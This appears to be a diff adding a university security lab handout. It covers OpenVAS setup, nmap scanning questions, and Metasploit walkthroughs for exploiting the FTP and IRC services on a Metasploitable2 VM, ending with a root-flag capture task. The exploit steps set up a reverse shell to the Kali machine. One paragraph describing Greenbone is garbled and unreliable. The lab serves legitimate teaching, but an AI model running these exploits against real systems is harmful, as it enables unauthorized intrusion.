@@ -1,0 +1,276 @@
+# ACIT 4630 – Lab 2 – Vulnerability Scanning
+
+![alt text](../images/lab2-fig2.png)
+
+## Lab Instructions
+
+We are going to use the Kali VM and the Metaploitable2 VM we created in the previous lab.
+
+An attacker or a pen tester goes through the reconnaissance phase first to look at the overall environment, identify specific targets, and focus on target enumeration.
+
+---
+
+### Scanning Vulnerability using OpenVAS (optional)
+
+>NOTE: For this section of the Lab we need to allocate 8-16 GB or RAM to our VM and since it's not possible for everyone, this section of the Lab is **OPTIONAL**. It's recommended that if you have the resources to go through with OpenVAS as it is a powerfull tool but you may feel free to skip this part (Scanning for Vulnerability with OpenVAV).
+
+OpenVAS, an endpoint scanning application and web application used to identify and detect vulnerabilities. It is widely used by companies as part of their risk mitigation solutions to quickly identify gaps in their production and even development servers or applications. This is not a complete solution, but it can help you fix common security vulnerabilities that may not be discovered.
+
+The condition of Greenbone mode is open (APEVALV) from infected chemistry (GVM) of the quality of the storage and the GitHub area. it is used in the Greenbone Security Manager device and is a comprehensive scan. An engine that runs an advanced and constantly updated Network Vulnerability Test Package (NVT).
+
+#### OpenVAS Installation
+
+```sh
+sudo apt update
+sudo apt upgrade -y
+sudo apt dist-upgrade -y
+sudo apt install openvas -y
+sudo gvm-setup
+```
+
+It will take a while to gather and download all the information.
+
+**Note**: Make sure to take a note of the password generated in the terminal.
+
+If installation was successfull, run:
+
+```sh
+gvm-check-setup
+```
+
+#### Unsuccessful Installation? Troubleshooting
+
+If you have encounter such or similar error:
+
+```sh
+[>] Starting PostgreSQL service
+[-] ERROR: The default PostgreSQL version (16) is not 17 that is required by libgvmd
+[-] ERROR: libgvmd needs PostgreSQL 17 to use the port 5432
+[-] ERROR: Use pg_upgradecluster to update your PostgreSQL cluster
+```
+
+It means you have 2 version of postgreSQL installed and the older version is using port 5432.
+
+1. To make sure of our assumption you can run the command below and confirm
+
+    ```sh
+    pg_lsclusters
+    ```
+
+2. we can simple delete the older version and change the latest version's port to `5432`:
+
+    ```sh
+    sudo apt remove --purge postgresql-16
+    sudo apt autoremove
+    sudo service postgresql stop
+    ```
+
+3. We just stoped the PostgreSQL service. now we can edit its config:
+
+    ```sh
+    sudo nano /etc/postgresql/17/main/postgresql.conf
+    ```
+
+4. In `nano` you can search a word with `CTRL + W`. let's search for the word `port` and change it to `5432`.
+
+5. After we Saved (`CTRL + S`) and Exited (`CTRL + X`), we need to restart the PostgreSQL service:
+
+    ```sh
+    sudo systemctl start postgresql
+    ```
+
+6. Now, it's time to re-run the openvas installation command:
+
+    ```sh
+    sudo gvm-setup
+    ```
+
+After the configuration process is complete, all the necessary OpenVAS processes will start and the web interface will open automatically. The web interface is running locally on port `9392` and can be accessed through [https://localhost:9392](https://localhost:9392). OpenVAS will also set up an `admin` account and automatically generate a `password` for this account which is displayed in the last section of the setup output.
+
+Again, If you want to verify your installation:
+
+```sh
+sudo gvm-check-setup
+```
+
+You can start or stop OpenVas by commnads below:
+
+```sh
+sudo gvm-start
+sudo gvm-stop
+```
+
+Follow the instruction for how to use and scan using OpenVAS software on [geeksforgeeks.org/installing-openvas-on-kali-linux/](https://www.geeksforgeeks.org/installing-openvas-on-kali-linux/)
+
+---
+
+### Host discovery and scanning using nmap
+
+- Q1: What is the purpose of the `-sn` flag in nmap?
+- Q2: In the previous lab, you used nmap to find what services running on open ports in the Metasploitable2 VM. Which nmap option (command flag) gives you the version of those services? why is it important for vulnerability scanning?
+- Q3: Try scanning Metasploitable2 VM from your Kali machine using `-A` option with nmap. What additional information about the open ports on Metasploitable2 VM can you get by using this option?
+
+### Exploring Vulnerabilities
+
+After we complete enumerating (retrieving and collecting services, usernames, computers, ... on a network) Metasploitable 2, we need to look for known vulnerabilities for operating systems and services running on this machine.
+
+Do the following steps
+for **ftp (on port 21)** and **IRC** services running on Metasploitable 2:
+
+- From your previous nmap results (Services with their version), find the software and the version for the services mentioned above and Google them (or chatGPT them up to you) info to see if this specific version of the software has any known vulnerabilities.
+- Nmap has a comprehensive library of scripts that provide many advanced capabilities. Find and use nmap with a [script](https://nmap.org/nsedoc/scripts/) that scans a target for a vulnerable version of these softwares.
+  - Hint: use `--script` option
+  - Hint: You should provide the port the service is running on
+- (Q4) What vulnerabilities did you find – both from Google and using the script?
+
+### Instructions for Exploiting FTP Service on Metasploitable2 Using Kali Linux
+
+**Objective:** Gain root access to a shell on the target endpoint (Metasploitable2).
+**Requirements:** Both Kali Linux and Metasploitable2 are on the same NAT Network.
+
+#### Scan the Target with Nmap
+
+1. Open a terminal on your Kali Linux machine.
+2. Use Nmap to discover open ports, services, and their versions on Metasploitable2:
+
+```sh
+nmap -sV [TARGET_IP]
+```
+
+#### Open Metasploit Framework
+
+1. Launch Metasploit Framework by typing:
+
+```sh
+msfconsole
+```
+
+### Exploit the FTP Service
+
+1. Search for the FTP exploit module based on the service version found in the Nmap scan:
+
+    ```sh
+    search ftp/[VERSION FULLNAME]
+    ```
+
+    Replace [VERSION] with the version number identified by Nmap.
+
+2. Select the appropriate FTP module:
+
+    ```sh
+    use [EXPLOIT_PATH or EXPLOIT_MODULE_NUMBER]
+    ```
+
+    Replace [EXPLOIT_PATH] with the path of the chosen exploit.
+
+3. Set the RHOSTS option to the target IP:
+
+    ```sh
+    set RHOSTS [TARGET_IP]
+    ```
+
+4. Run the exploit:
+
+    ```sh
+    exploit
+    ```
+
+5. If successful, you will gain access to the shell. To verify, run:
+
+    ```sh
+    whoami
+    ifconfig
+    ```
+
+### Instructions for Exploiting IRC Port on Metasploitable2 Using Kali Linux
+
+#### Exploit the IRC Service
+
+1. Make sure you are in Metasploit Framework
+
+    ```sh
+    msfconsole
+    ```
+
+2. Search for the IRC exploit module based on the service version:
+
+    ```sh
+    search irc [VERSION]
+    ```
+
+    Replace [VERSION] with the version number identified by Nmap.
+
+3. Select the appropriate IRC module:
+
+    ```sh
+    use [EXPLOIT_PATH]
+    ```
+
+4. Set the necessary options:
+
+    ```sh
+    set RHOSTS [TARGET_IP]
+    set RPORT [IRC_PORT]
+    set LHOST [KALI_IP]
+    set LPORT 4444
+    ```
+
+    Replace [IRC_PORT] with the port number of the IRC service, [YOUR_IP] with your Kali machine IP, and `4444` is recommended local port for this exploit.feel free to test with your desired port.
+
+5. Set the payload: you can see all the payloads by show payloads command.
+
+    ```sh
+    set PAYLOAD cmd/unix/reverse
+    ```
+
+    The `cmd/unix/reverse` payload in the Metasploit Framework is a reverse shell payload specifically designed for Unix-based systems. This is recomanded for this attack. feel free to try other PAYLOADs.
+
+    **Reverse Shell Payload:**
+    Reverse Shell: A reverse shell is a type of shell where the target machine (the victim) initiates a connection back to the attacker's machine. This is typically used to bypass firewalls and network address translation (NAT).
+
+6. Run the exploit:
+
+    ```sh
+    exploit
+    ```
+
+7. Verify access by running:
+
+    ```sh
+    whoami
+    echo $0
+    ifconfig
+    ```
+
+(Q5) Explain 3 above commands and their results.
+Ensure each step is completed accurately to gain root access. If any step fails, review configurations or try different modules/payloads suited to the service versions found.
+
+---
+
+## **🕵️ Mission 2 – The Root of All Secrets**
+
+> *The chatter on the dark nets speaks of a vault, sealed deep within the target’s core.
+> They say only the system’s supreme ruler holds the key…*
+
+Your task:
+
+1. **Breach the system** – exploit the vulnerable FTP or IRC service and gain a remote shell.
+2. **Ascend to power** – use your foothold to become the all-powerful root user.
+3. **Unlock the vault** – somewhere in the root’s private chamber lies a single note.
+
+    *The note begins with `BCIT{` and proves you’ve reached the top.*
+
+4. **Bring it back intact** – your proof is the exact text of the flag **and** a screenshot of you retrieving it inside your shell.
+
+---
+
+**💡 Pro Tip:**
+The vault will not open for imposters. If you’re not root, you won’t even find the door.
+
+---
+
+### Submission For Lab 2
+
+- Create a report by answering the questions in the lab above.
+- Add screenshots of exploit command and result of commands to verify the access (3 above and last commands); for each exploit (FTP and IRC)
+- Submit your report to the Learning Hub in PDF format.
